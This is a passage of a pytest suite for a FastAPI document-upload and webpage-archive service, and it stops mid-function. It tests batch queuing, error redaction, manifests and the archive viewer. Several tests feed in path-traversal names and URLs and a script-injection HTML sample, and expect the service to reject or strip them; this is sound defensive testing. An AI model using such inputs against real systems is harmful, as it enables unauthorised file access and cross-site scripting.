import hashlib
import io
import json
import os
import stat
import zipfile
from collections.abc import Generator
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, select
from sqlalchemy.orm import Session, sessionmaker
from sqlalchemy.pool import StaticPool

os.environ["ADMIN_PASSWORD_HASH"] = "$2b$12$AVhh6Snv3FcaevOnJ0dwR.SfBrkaPp036/Nt/wwdVTsVQNuR1XKx2"
os.environ["SESSION_SECRET"] = "test-session-secret"
os.environ["DATABASE_URL"] = "sqlite+pysqlite:///:memory:"

from app.config import Settings, get_settings
from app.database import Base, get_db
from app.main import app
from app.models import IngestionEvent, IngestionJob, Source, Upload, UploadBatch, utcnow


SUPPORTED_FIXTURES = [
    ("sample.md", "text/markdown"),
    ("sample.markdown", "text/markdown"),
    ("sample.txt", "text/plain"),
    ("sample.html", "text/html"),
    ("sample.htm", "text/html"),
    ("sample.epub", "application/epub+zip"),
]


@pytest.fixture()
def db_session() -> Generator[Session, None, None]:
    engine = create_engine(
        "sqlite+pysqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    TestingSessionLocal = sessionmaker(bind=engine, autoflush=False, expire_on_commit=False)
    Base.metadata.create_all(bind=engine)

    db = TestingSessionLocal()
    try:
        yield db
    finally:
        db.close()


@pytest.fixture()
def client(tmp_path: Path, db_session: Session) -> Generator[TestClient, None, None]:
    def override_db() -> Generator[Session, None, None]:
        yield db_session

    def override_settings() -> Settings:
        return Settings(
            ADMIN_PASSWORD_HASH=os.environ["ADMIN_PASSWORD_HASH"],
            SESSION_SECRET=os.environ["SESSION_SECRET"],
            DATABASE_URL="sqlite+pysqlite:///:memory:",
            UPLOAD_DIR=str(tmp_path / "uploads"),
        )

    app.dependency_overrides[get_db] = override_db
    app.dependency_overrides[get_settings] = override_settings
    with TestClient(app) as test_client:
        assert test_client.post("/auth/login", json={"password": "admin-password"}).status_code == 200
        yield test_client
    app.dependency_overrides.clear()


@pytest.fixture()
def unauthenticated_client(tmp_path: Path, db_session: Session) -> Generator[TestClient, None, None]:
    def override_db() -> Generator[Session, None, None]:
        yield db_session

    def override_settings() -> Settings:
        return Settings(
            ADMIN_PASSWORD_HASH=os.environ["ADMIN_PASSWORD_HASH"],
            SESSION_SECRET=os.environ["SESSION_SECRET"],
            DATABASE_URL="sqlite+pysqlite:///:memory:",
            UPLOAD_DIR=str(tmp_path / "uploads"),
        )

    app.dependency_overrides[get_db] = override_db
    app.dependency_overrides[get_settings] = override_settings
    with TestClient(app) as test_client:
        yield test_client
    app.dependency_overrides.clear()


@pytest.mark.parametrize(("filename", "content_type"), SUPPORTED_FIXTURES)
def test_upload_supported_files_creates_raw_file_and_queued_job(
    client: TestClient,
    db_session: Session,
    filename: str,
    content_type: str,
) -> None:
    content = f"content for {filename}".encode()

    response = client.post("/uploads", files={"file": (filename, content, content_type)})

    assert response.status_code == 201
    payload = response.json()
    assert set(payload) == {"upload_id", "job_id", "queued"}
    assert payload["queued"] is True

    upload = db_session.get(Upload, payload["upload_id"])
    assert upload is not None
    assert upload.original_filename == filename
    assert upload.sha256 == hashlib.sha256(content).hexdigest()
    assert upload.size_bytes == len(content)
    assert Path(upload.stored_path).name == f"{upload.id}{Path(filename).suffix}"
    assert Path(upload.stored_path).read_bytes() == content

    job = db_session.get(IngestionJob, payload["job_id"])
    assert job is not None
    assert job.upload_id == upload.id
    assert job.status == "queued"

    event = db_session.scalars(select(IngestionEvent).where(IngestionEvent.ingestion_job_id == job.id)).one()
    assert event.event_type == "queued"


def test_upload_accepts_ddb_saved_html_through_generic_html_flow(client: TestClient, db_session: Session) -> None:
    fixture = Path(__file__).resolve().parent / "fixtures" / "ddb" / "a-world-of-your-own-ddb.html"
    content = fixture.read_bytes()

    response = client.post("/uploads", files={"file": ("ddb.html", content, "text/html")})

    assert response.status_code == 201
    payload = response.json()
    upload = db_session.get(Upload, payload["upload_id"])
    assert upload is not None
    assert upload.extension == ".html"
    assert Path(upload.stored_path).read_bytes() == content
    assert db_session.get(IngestionJob, payload["job_id"]).status == "queued"


def test_multi_zip_batch_success_queues_each_zip_atomically(
    client: TestClient,
    db_session: Session,
    batch_zip_artifacts: dict[str, Path],
) -> None:
    response = client.post(
        "/uploads",
        files=[
            ("file", ("valid-ddb-a.zip", batch_zip_artifacts["valid-ddb-a.zip"].read_bytes(), "application/zip")),
            ("file", ("valid-ddb-b.zip", batch_zip_artifacts["valid-ddb-b.zip"].read_bytes(), "application/zip")),
        ],
    )

    assert response.status_code == 201
    payload = response.json()
    assert set(payload) == {"batch_id", "status", "items", "queued", "upload_status_url"}
    assert payload["batch_id"]
    assert payload["status"] == "queued"
    assert payload["upload_status_url"] == f"/upload?batch_id={payload['batch_id']}"
    assert payload["queued"] is True
    assert [item["filename"] for item in payload["items"]] == ["valid-ddb-a.zip", "valid-ddb-b.zip"]
    assert all(item["status"] == "queued" for item in payload["items"])
    assert all(item["upload_id"] for item in payload["items"])
    assert all(item["job_id"] for item in payload["items"])

    uploads = db_session.scalars(select(Upload)).all()
    jobs = db_session.scalars(select(IngestionJob)).all()
    assert len(uploads) == 2
    assert len(jobs) == 2
    assert {upload.original_filename for upload in uploads} == {"valid-ddb-a.zip", "valid-ddb-b.zip"}
    assert {upload.extension for upload in uploads} == {".html"}
    assert {job.status for job in jobs} == {"queued"}
    assert db_session.scalars(select(IngestionEvent)).all()


def test_multi_zip_enqueue_failure_is_atomic_before_child_jobs_are_left_behind(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
    batch_zip_artifacts: dict[str, Path],
) -> None:
    response = client.post(
        "/uploads",
        files=[
            ("file", ("valid-ddb-a.zip", batch_zip_artifacts["valid-ddb-a.zip"].read_bytes(), "application/zip")),
            ("file", ("invalid-zip.zip", batch_zip_artifacts["invalid-zip.zip"].read_bytes(), "application/zip")),
            ("file", ("valid-ddb-b.zip", batch_zip_artifacts["valid-ddb-b.zip"].read_bytes(), "application/zip")),
        ],
    )

    assert response.status_code == 400
    assert "invalid-zip.zip" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []
    assert db_session.scalars(select(IngestionEvent)).all() == []
    assert not (tmp_path / "uploads" / "source-archives").exists()


def test_multi_zip_partial_failure_fixture_setup_queues_worker_time_failures(
    client: TestClient,
    db_session: Session,
    batch_zip_artifacts: dict[str, Path],
) -> None:
    response = client.post(
        "/uploads",
        files=[
            ("file", ("valid-ddb-a.zip", batch_zip_artifacts["valid-ddb-a.zip"].read_bytes(), "application/zip")),
            ("file", ("malformed-ddb.zip", batch_zip_artifacts["malformed-ddb.zip"].read_bytes(), "application/zip")),
        ],
    )

    assert response.status_code == 201
    payload = response.json()
    assert payload["upload_status_url"] == f"/upload?batch_id={payload['batch_id']}"
    assert [item["filename"] for item in payload["items"]] == ["valid-ddb-a.zip", "malformed-ddb.zip"]
    assert [item["status"] for item in payload["items"]] == ["queued", "queued"]
    assert len(db_session.scalars(select(Upload)).all()) == 2
    assert len(db_session.scalars(select(IngestionJob)).all()) == 2


def test_batch_status_endpoint_contract(client: TestClient, batch_zip_artifacts: dict[str, Path]) -> None:
    create_response = client.post(
        "/uploads",
        files=[
            ("file", ("valid-ddb-a.zip", batch_zip_artifacts["valid-ddb-a.zip"].read_bytes(), "application/zip")),
            ("file", ("valid-ddb-b.zip", batch_zip_artifacts["valid-ddb-b.zip"].read_bytes(), "application/zip")),
        ],
    )
    assert create_response.status_code == 201
    batch_id = create_response.json()["batch_id"]

    response = client.get(f"/uploads/batches/{batch_id}")

    assert response.status_code == 200
    payload = response.json()
    assert set(payload) == {"batch_id", "status", "file_count", "created_at", "updated_at", "items", "summary", "upload_status_url"}
    assert payload["batch_id"] == batch_id
    assert payload["status"] == "queued"
    assert payload["file_count"] == 2
    assert payload["upload_status_url"] == f"/upload?batch_id={batch_id}"
    assert set(payload["summary"]) == {"queued", "running", "completed", "partial_failed", "failed", "total"}
    assert payload["summary"] == {"queued": 2, "running": 0, "completed": 0, "partial_failed": 0, "failed": 0, "total": 2}
    assert [item["filename"] for item in payload["items"]] == ["valid-ddb-a.zip", "valid-ddb-b.zip"]
    for item in payload["items"]:
        assert set(item) == {"filename", "upload_id", "job_id", "status", "error"}
        assert item["status"] == "queued"
        assert item["error"] is None


def test_batch_status_endpoint_returns_404_for_unknown_batch(client: TestClient) -> None:
    response = client.get("/uploads/batches/unknown-batch-id")

    assert response.status_code == 404
    assert response.json() == {"detail": "Upload batch not found"}


def test_batch_status_endpoint_redacts_unsafe_child_errors(client: TestClient, db_session: Session, tmp_path: Path) -> None:
    now = utcnow()
    batch = UploadBatch(status="failed", file_count=1, created_at=now, updated_at=now)
    db_session.add(batch)
    db_session.flush()
    upload = Upload(
        original_filename="malformed-ddb.zip",
        stored_path=str(tmp_path / "malformed.html"),
        content_type="application/zip",
        extension=".html",
        sha256="abc123",
        size_bytes=123,
        batch_id=batch.id,
        batch_position=0,
        created_at=now,
    )
    db_session.add(upload)
    db_session.flush()
    job = IngestionJob(
        upload_id=upload.id,
        batch_id=batch.id,
        status="failed",
        error_summary="Traceback: File \"/srv/the-stacks/uploads/secret.py\" exposed a path",
        created_at=now,
        updated_at=now,
    )
    db_session.add(job)
    db_session.commit()

    response = client.get(f"/uploads/batches/{batch.id}")

    assert response.status_code == 200
    response_text = json.dumps(response.json())
    assert "Traceback" not in response_text
    assert "/srv/the-stacks/uploads" not in response_text
    error = response.json()["items"][0]["error"]
    assert error == {
        "filename": "malformed-ddb.zip",
        "category": "unknown_error",
        "message": "Import failed. Review the file and try again.",
    }


@pytest.mark.parametrize(
    ("child_statuses", "expected_status"),
    [
        (["queued", "queued"], "queued"),
        (["completed", "queued"], "running"),
        (["completed", "processing"], "running"),
        (["completed", "completed"], "completed"),
        (["failed", "failed"], "failed"),
        (["completed", "failed"], "partial_failed"),
    ],
)
def test_batch_status_endpoint_aggregate_algorithm(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
    child_statuses: list[str],
    expected_status: str,
) -> None:
    batch_id = _create_batch_with_statuses(db_session, tmp_path, child_statuses)

    response = client.get(f"/uploads/batches/{batch_id}")

    assert response.status_code == 200
    assert response.json()["status"] == expected_status


def test_batch_status_endpoint_orders_children_by_position_created_at_and_id(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    now = utcnow()
    batch = UploadBatch(status="queued", file_count=4, created_at=now, updated_at=now)
    db_session.add(batch)
    db_session.flush()

    children = [
        ("third.zip", 2, now, "00000000-0000-0000-0000-000000000003"),
        ("second.zip", 1, now, "00000000-0000-0000-0000-000000000002"),
        ("first.zip", 0, now, "00000000-0000-0000-0000-000000000004"),
        ("tie-breaker.zip", 0, now, "00000000-0000-0000-0000-000000000001"),
    ]
    for filename, position, created_at, upload_id in children:
        upload = Upload(
            id=upload_id,
            original_filename=filename,
            stored_path=str(tmp_path / filename),
            content_type="application/zip",
            extension=".html",
            sha256=f"sha-{filename}",
            size_bytes=123,
            batch_id=batch.id,
            batch_position=position,
            created_at=created_at,
        )
        db_session.add(upload)
        db_session.flush()
        db_session.add(IngestionJob(upload_id=upload.id, batch_id=batch.id, status="queued", created_at=created_at, updated_at=created_at))
    db_session.commit()

    response = client.get(f"/uploads/batches/{batch.id}")

    assert response.status_code == 200
    assert [item["filename"] for item in response.json()["items"]] == ["tie-breaker.zip", "first.zip", "second.zip", "third.zip"]


@pytest.mark.parametrize(
    ("files", "expected_detail"),
    [
        (["valid-ddb-a.zip", "valid-ddb-a.zip"], "duplicate filename"),
        (["../valid-ddb-a.zip", "valid-ddb-b.zip"], "unsafe filename"),
    ],
)
def test_multi_zip_rejects_unsafe_or_duplicate_filenames(
    client: TestClient,
    db_session: Session,
    batch_zip_artifacts: dict[str, Path],
    files: list[str],
    expected_detail: str,
) -> None:
    response = client.post(
        "/uploads",
        files=[
            (
                "file",
                (filename, batch_zip_artifacts[Path(filename).name].read_bytes(), "application/zip"),
            )
            for filename in files
        ],
    )

    assert response.status_code == 400
    assert expected_detail in response.json()["detail"]
    assert "../valid-ddb-a.zip" not in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []


def test_multi_zip_rejects_empty_request(client: TestClient, db_session: Session) -> None:
    response = client.post("/uploads", files=[])

    assert response.status_code == 400
    assert "upload_limit_exceeded" in response.json()["detail"]
    assert "at least one file" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []


def test_multi_zip_rejects_max_file_count(
    client: TestClient,
    db_session: Session,
    batch_zip_artifacts: dict[str, Path],
) -> None:
    content = batch_zip_artifacts["valid-ddb-a.zip"].read_bytes()

    response = client.post(
        "/uploads",
        files=[("file", (f"valid-ddb-{index}.zip", content, "application/zip")) for index in range(26)],
    )

    assert response.status_code == 400
    assert "upload_limit_exceeded" in response.json()["detail"]
    assert "maximum file count" in response.json()["detail"]
    assert "25" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []


def test_multi_zip_rejects_aggregate_size_limit(
    client: TestClient,
    db_session: Session,
    batch_zip_artifacts: dict[str, Path],
    tmp_path: Path,
) -> None:
    def override_settings() -> Settings:
        settings = Settings(
            ADMIN_PASSWORD_HASH=os.environ["ADMIN_PASSWORD_HASH"],
            SESSION_SECRET=os.environ["SESSION_SECRET"],
            DATABASE_URL="sqlite+pysqlite:///:memory:",
            UPLOAD_DIR=str(tmp_path / "uploads"),
        )
        object.__setattr__(settings, "upload_batch_max_size_bytes", 10)
        return settings

    app.dependency_overrides[get_settings] = override_settings

    response = client.post(
        "/uploads",
        files=[
            ("file", ("valid-ddb-a.zip", batch_zip_artifacts["valid-ddb-a.zip"].read_bytes(), "application/zip")),
            ("file", ("valid-ddb-b.zip", batch_zip_artifacts["valid-ddb-b.zip"].read_bytes(), "application/zip")),
        ],
    )

    assert response.status_code == 413
    assert "upload_limit_exceeded" in response.json()["detail"]
    assert "aggregate size" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []


def test_single_upload_compatibility_still_uses_legacy_file_contract(
    client: TestClient,
    db_session: Session,
    batch_zip_artifacts: dict[str, Path],
) -> None:
    content = batch_zip_artifacts["valid-ddb-a.zip"].read_bytes()

    response = client.post("/uploads", files={"file": ("valid-ddb-a.zip", content, "application/zip")})

    assert response.status_code == 201
    payload = response.json()
    assert set(payload) == {"upload_id", "job_id", "queued"}
    assert payload["queued"] is True
    upload = db_session.get(Upload, payload["upload_id"])
    job = db_session.get(IngestionJob, payload["job_id"])
    assert upload is not None
    assert job is not None
    assert upload.original_filename == "valid-ddb-a.zip"
    assert job.upload_id == upload.id


@pytest.mark.parametrize(
    ("filename", "content_type"),
    [
        ("sample.pdf", "application/pdf"),
        ("sample.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
        ("sample.png", "image/png"),
        ("sample.bin", "application/octet-stream"),
    ],
)
def test_upload_rejects_unsupported_files(
    client: TestClient,
    db_session: Session,
    filename: str,
    content_type: str,
) -> None:
    response = client.post("/uploads", files={"file": (filename, b"unsupported", content_type)})

    assert response.status_code == 415
    assert response.json() == {"detail": "Unsupported file type. Supported types: ZIP, EPUB, HTML, TXT, MD."}
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []


def test_upload_rejects_supported_extension_with_wrong_content_type(client: TestClient) -> None:
    response = client.post("/uploads", files={"file": ("sample.md", b"markdown", "application/pdf")})

    assert response.status_code == 415
    assert response.json() == {"detail": "Unsupported file type. Supported types: ZIP, EPUB, HTML, TXT, MD."}


def test_upload_valid_webpage_archive_stores_immutable_source_archive(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    content = _zip_bytes(
        {
            "page.html": b"<html><head><title>Archive</title></head><body><h1>Saved page</h1><p>Hello.</p></body></html>",
            "page_files/style.css": b"body { color: black; }",
            "page_files/image.png": b"\x89PNG\r\n\x1a\n",
        }
    )

    response = client.post("/uploads", files={"file": ("saved-page.zip", content, "application/zip")})

    assert response.status_code == 201
    payload = response.json()
    upload = db_session.get(Upload, payload["upload_id"])
    job = db_session.get(IngestionJob, payload["job_id"])
    assert upload is not None
    assert job is not None
    assert upload.original_filename == "saved-page.zip"
    assert upload.extension == ".html"
    assert upload.content_type == "application/zip"
    assert upload.sha256 == hashlib.sha256(content).hexdigest()

    job_metadata = json.loads(job.metadata_json)
    source_id = job_metadata["source_id"]
    archive_root = tmp_path / "uploads" / "source-archives" / source_id
    manifest_path = archive_root / "manifest.json"
    assert Path(upload.stored_path) == archive_root / "served" / "page.html"
    assert (archive_root / "original.zip").read_bytes() == content
    assert (archive_root / "original" / "page.html").read_bytes().startswith(b"<html>")
    served_text = Path(upload.stored_path).read_text(encoding="utf-8")
    assert "Hello." in served_text
    assert "data-source-chunk-id" in served_text
    assert (archive_root / "original" / "page_files" / "style.css").read_bytes() == b"body { color: black; }"
    assert manifest_path.exists()

    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["source_id"] == source_id
    assert manifest["source_type"] == "archived_webpage"
    assert manifest["original_filename"] == "saved-page.zip"
    assert manifest["primary_html_path"] == "page.html"
    assert manifest["served_html_path"] == "page.html"
    assert manifest["anchor_map_path"] == "anchor-map.json"
    assert manifest["original_sha256"] == hashlib.sha256(content).hexdigest()
    assert manifest["file_count"] == 3
    assert manifest["extracted_size_bytes"] == sum(entry["size_bytes"] for entry in manifest["entries"])
    assert {entry["path"] for entry in manifest["entries"]} == {
        "page.html",
        "page_files/style.css",
        "page_files/image.png",
    }
    assert (archive_root / "served" / "page.html").exists()
    assert (archive_root / "anchor-map.json").exists()


def test_archive_job_metadata_becomes_ingested_source_metadata(client: TestClient, db_session: Session) -> None:
    content = _zip_bytes({"page.html": b"<html><body><h1>Saved page</h1><p>Hello archive.</p></body></html>"})
    response = client.post("/uploads", files={"file": ("saved-page.zip", content, "application/zip")})
    assert response.status_code == 201
    payload = response.json()
    job = db_session.get(IngestionJob, payload["job_id"])
    assert job is not None
    source_id = json.loads(job.metadata_json)["source_id"]

    from app.ingestion import process_claimed_job

    processed = process_claimed_job(db_session, job.id, continue_to_index=False)

    assert processed.status == "awaiting_embedding"
    source = db_session.get(Source, source_id)
    assert source is not None
    assert source.source_type == "archived_webpage"
    source_metadata = json.loads(source.metadata_json)
    assert source_metadata["archive_primary_html_path"] == "page.html"
    assert source_metadata["archive_entry_path"] == "page.html"
    assert source_metadata["archive_served_html_path"] == "page.html"
    assert source_metadata["archive_served_entry_path"] == "page.html"
    assert source_metadata["archive_anchor_map_path"] == "anchor-map.json"
    assert source_metadata["archive_file_count"] == 1


def test_archive_served_html_rewrites_assets_and_creates_anchor_map(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    original_html = b"""
    <html>
      <head><title>Archive</title><link rel="stylesheet" href="page_files/style.css"></head>
      <body>
        <h1>Saved page</h1>
        <p>Hello archive citation.</p>
        <img src="page_files/image.png" alt="local image">
      </body>
    </html>
    """
    content = _zip_bytes(
        {
            "page.html": original_html,
            "page_files/style.css": b"body { color: black; }",
            "page_files/image.png": b"\x89PNG\r\n\x1a\n",
        }
    )

    response = client.post("/uploads", files={"file": ("saved-page.zip", content, "application/zip")})

    assert response.status_code == 201
    job = db_session.get(IngestionJob, response.json()["job_id"])
    assert job is not None
    source_id = json.loads(job.metadata_json)["source_id"]
    archive_root = tmp_path / "uploads" / "source-archives" / source_id
    served_html = (archive_root / "served" / "page.html").read_text(encoding="utf-8")
    anchor_map = json.loads((archive_root / "anchor-map.json").read_text(encoding="utf-8"))

    assert (archive_root / "original" / "page.html").read_bytes() == original_html
    assert f'/records/sources/{source_id}/archive/assets/page_files/style.css' in served_html
    assert f'/records/sources/{source_id}/archive/assets/page_files/image.png' in served_html
    assert 'data-source-chunk-id="' in served_html
    assert anchor_map["source_path"] == "page.html"
    assert len(anchor_map["anchors"]) == 1
    anchor = anchor_map["anchors"][0]
    assert anchor["heading_path"] == ["Saved page"]
    assert anchor["quote"] == "Hello archive citation."
    assert anchor["source_path"] == "page.html"
    assert anchor["viewer_fragment"].startswith("#source-chunk-")
    assert anchor["selector"].startswith('[data-source-chunk-id="archive-')

    from app.ingestion import process_claimed_job

    process_claimed_job(db_session, job.id, continue_to_index=False)

    asset_response = client.get(f"/records/sources/{source_id}/archive/assets/page_files/style.css")
    assert asset_response.status_code == 200
    assert asset_response.text == "body { color: black; }"


def test_upload_allows_macos_ds_store_archive_entries(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    content = _zip_bytes(
        {
            "A/.DS_Store": b"mac metadata",
            "__MACOSX/A/._page.html": b"appledouble metadata",
            "__MACOSX/Introduction/._Introduction - Dungeon Masters Guide (2014) - Dungeons & Dragons - Sources - D&D Beyond_files": b"resource fork metadata",
            "A/page.html": b"<html><body><h1>Saved page</h1><p>Hello archive.</p></body></html>",
        }
    )

    response = client.post("/uploads", files={"file": ("saved-page.zip", content, "application/zip")})

    assert response.status_code == 201
    job = db_session.get(IngestionJob, response.json()["job_id"])
    assert job is not None
    source_id = json.loads(job.metadata_json)["source_id"]
    archive_root = tmp_path / "uploads" / "source-archives" / source_id
    assert (archive_root / "original" / "A" / ".DS_Store").read_bytes() == b"mac metadata"
    assert (archive_root / "original" / "__MACOSX" / "A" / "._page.html").read_bytes() == b"appledouble metadata"

    manifest = json.loads((archive_root / "manifest.json").read_text(encoding="utf-8"))
    metadata_entries = {entry["path"]: entry for entry in manifest["entries"] if entry["mime_type"] == "application/octet-stream"}
    assert metadata_entries["A/.DS_Store"]
    assert metadata_entries["__MACOSX/A/._page.html"]
    assert metadata_entries["__MACOSX/Introduction/._Introduction - Dungeon Masters Guide (2014) - Dungeons & Dragons - Sources - D&D Beyond_files"]


def test_upload_allows_extensionless_browser_saved_assets(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    content = _zip_bytes(
        {
            "Introduction/page.html": b'<html><body><h1>Introduction</h1><p>Saved archive text.</p><a href="page_files/species">Species</a></body></html>',
            "Introduction/page_files/species": b'{"kind":"route-manifest"}',
        }
    )

    response = client.post("/uploads", files={"file": ("Introduction.zip", content, "application/zip")})

    assert response.status_code == 201
    job = db_session.get(IngestionJob, response.json()["job_id"])
    assert job is not None
    source_id = json.loads(job.metadata_json)["source_id"]
    archive_root = tmp_path / "uploads" / "source-archives" / source_id
    assert (archive_root / "original" / "Introduction" / "page_files" / "species").read_bytes() == b'{"kind":"route-manifest"}'

    manifest = json.loads((archive_root / "manifest.json").read_text(encoding="utf-8"))
    manifest_entry = next(entry for entry in manifest["entries"] if entry["path"] == "Introduction/page_files/species")
    assert manifest_entry["mime_type"] == "application/octet-stream"

    from app.ingestion import process_claimed_job

    process_claimed_job(db_session, job.id, continue_to_index=False)

    asset_response = client.get(f"/records/sources/{source_id}/archive/assets/Introduction/page_files/species")
    assert asset_response.status_code == 200
    assert asset_response.headers["content-type"].startswith("application/octet-stream")
    assert asset_response.content == b'{"kind":"route-manifest"}'


def test_archive_viewer_and_assets_require_authentication(unauthenticated_client: TestClient) -> None:
    viewer_response = unauthenticated_client.get("/records/sources/source-id/archive/viewer")
    asset_response = unauthenticated_client.get("/records/sources/source-id/archive/assets/page_files/style.css")

    assert viewer_response.status_code == 401
    assert asset_response.status_code == 401


def test_archive_viewer_serves_sanitized_html_with_target_highlight_and_iframe_headers(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    source_id = _upload_and_ingest_archive(
        client,
        db_session,
        {
            "page.html": b"""
            <html>
              <head><title>Archive</title></head>
              <body onload="steal()">
                <h1>Saved page</h1>
                <script>alert('x')</script>
                <p onclick="steal()">Hello archive citation.</p>
              </body>
            </html>
            """,
        },
    )
    anchor_map = json.loads((tmp_path / "uploads" / "source-archives" / source_id / "anchor-map.json").read_text(encoding="utf-8"))
    chunk_id = anchor_map["anchors"][0]["chunk_id"]

    response = client.get(f"/records/sources/{source_id}/archive/viewer", params={"target": chunk_id})

    assert response.status_code == 200
    assert response.headers["content-type"].startswith("text/html")
    assert response.headers["x-frame-options"] == "SAMEORIGIN"
    assert response.headers["content-security-policy"] == "frame-ancestors 'self'"
    assert "Hello archive citation." in response.text
    assert "archive-target-highlight" in response.text
    assert f"url=#{chunk_id}" in response.text
    assert "<script" not in response.text.lower()
    assert "onclick" not in response.text.lower()
    assert str(tmp_path) not in response.text


def test_archive_viewer_repairs_stale_source_metadata_from_manifest(
    client: TestClient,
    db_session: Session,
) -> None:
    source_id = _upload_and_ingest_archive(
        client,
        db_session,
        {"nested/page.html": b"<html><body><h1>Saved page</h1><p>Hello repaired archive.</p></body></html>"},
    )
    source = db_session.get(Source, source_id)
    assert source is not None
    source.metadata_json = json.dumps(
        {
            "source_id": source_id,
            "source_type": "archived_webpage",
            "archive_manifest_path": "/stale/uploads/source-archives/stale/manifest.json",
            "archive_served_html_path": "/stale/uploads/source-archives/stale/served/page.html",
        }
    )
    db_session.commit()

    response = client.get(f"/records/sources/{source_id}/archive/viewer")

    assert response.status_code == 200
    assert "Hello repaired archive." in response.text
    repaired = db_session.get(Source, source_id)
    assert repaired is not None
    repaired_metadata = json.loads(repaired.metadata_json)
    assert repaired_metadata["archive_served_html_path"] == "nested/page.html"
    assert repaired_metadata["archive_served_entry_path"] == "nested/page.html"
    assert repaired_metadata["archive_primary_html_path"] == "nested/page.html"
    assert repaired_metadata["archive_anchor_map_path"] == "anchor-map.json"


def test_archive_viewer_reconstructs_missing_source_from_archive_job_metadata(
    client: TestClient,
    db_session: Session,
) -> None:
    response = client.post(
        "/uploads",
        files={"file": ("saved-page.zip", _zip_bytes({"page.html": b"<html><body><h1>Saved page</h1><p>Hello queued archive.</p></body></html>"}), "application/zip")},
    )
    assert response.status_code == 201
    job = db_session.get(IngestionJob, response.json()["job_id"])
    assert job is not None
    source_id = json.loads(job.metadata_json)["source_id"]
    assert db_session.get(Source, source_id) is None

    viewer_response = client.get(f"/records/sources/{source_id}/archive/viewer")

    assert viewer_response.status_code == 200
    assert "Hello queued archive." in viewer_response.text
    repaired_source = db_session.get(Source, source_id)
    assert repaired_source is not None
    assert repaired_source.source_type == "archived_webpage"
    assert repaired_source.upload_id == job.upload_id
    repaired_metadata = json.loads(repaired_source.metadata_json)
    assert repaired_metadata["archive_served_html_path"] == "page.html"
    assert repaired_metadata["archive_served_entry_path"] == "page.html"


def test_archive_viewer_still_404s_when_repair_artifacts_are_missing(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    source_id = _upload_and_ingest_archive(
        client,
        db_session,
        {"page.html": b"<html><body><h1>Saved page</h1><p>Missing ingested file.</p></body></html>"},
    )
    served_html_path = tmp_path / "uploads" / "source-archives" / source_id / "served" / "page.html"
    served_html_path.unlink()

    stale_source_response = client.get(f"/records/sources/{source_id}/archive/viewer")

    assert stale_source_response.status_code == 404

    response = client.post(
        "/uploads",
        files={"file": ("saved-page.zip", _zip_bytes({"page.html": b"<html><body><h1>Saved page</h1><p>Missing file.</p></body></html>"}), "application/zip")},
    )
    assert response.status_code == 201
    job = db_session.get(IngestionJob, response.json()["job_id"])
    assert job is not None
    queued_source_id = json.loads(job.metadata_json)["source_id"]
    queued_served_html_path = tmp_path / "uploads" / "source-archives" / queued_source_id / "served" / "page.html"
    queued_served_html_path.unlink()

    viewer_response = client.get(f"/records/sources/{queued_source_id}/archive/viewer")

    assert viewer_response.status_code == 404
    assert db_session.get(Source, queued_source_id) is None


def test_archive_asset_route_serves_local_assets_with_mime_and_iframe_headers(
    client: TestClient,
    db_session: Session,
) -> None:
    source_id = _upload_and_ingest_archive(
        client,
        db_session,
        {
            "page.html": b"""
            <html>
              <head><link rel="stylesheet" href="page_files/style.css"></head>
              <body><h1>Saved page</h1><p>Hello.</p><img src="page_files/image.png"></body>
            </html>
            """,
            "page_files/style.css": b"body { color: black; }",
            "page_files/image.png": b"\x89PNG\r\n\x1a\n",
        },
    )

    css_response = client.get(f"/records/sources/{source_id}/archive/assets/page_files/style.css")
    image_response = client.get(f"/records/sources/{source_id}/archive/assets/page_files/image.png")

    assert css_response.status_code == 200
    assert css_response.headers["content-type"].startswith("text/css")
    assert css_response.headers["x-frame-options"] == "SAMEORIGIN"
    assert css_response.headers["content-security-policy"] == "frame-ancestors 'self'"
    assert css_response.text == "body { color: black; }"
    assert image_response.status_code == 200
    assert image_response.headers["content-type"].startswith("image/png")
    assert image_response.content == b"\x89PNG\r\n\x1a\n"


@pytest.mark.parametrize(
    ("url", "expected_status"),
    [
        ("/records/sources/{source_id}/archive/viewer?path=../original/page.html", 400),
        ("/records/sources/{source_id}/archive/viewer?path=page_files/style.css", 400),
        ("/records/sources/{source_id}/archive/assets/%2E%2E/page.html", 400),
        ("/records/sources/{source_id}/archive/assets/page.html", 400),
        ("/records/sources/{source_id}/archive/assets/page_files", 404),
        ("/records/sources/unknown-source/archive/viewer", 404),
    ],
)
def test_archive_viewer_and_asset_routes_reject_traversal_unknown_sources_and_directories(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
    url: str,
    expected_status: int,
) -> None:
    source_id = _upload_and_ingest_archive(
        client,
        db_session,
        {
            "page.html": b"<html><body><h1>Saved page</h1><p>Hello.</p></body></html>",
            "page_files/style.css": b"body { color: black; }",
        },
    )

    response = client.get(url.format(source_id=source_id))

    assert response.status_code == expected_status
    assert str(tmp_path) not in response.text


def test_records_job_and_chunk_metadata_do_not_expose_archive_filesystem_paths(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    source_id = _upload_and_ingest_archive(
        client,
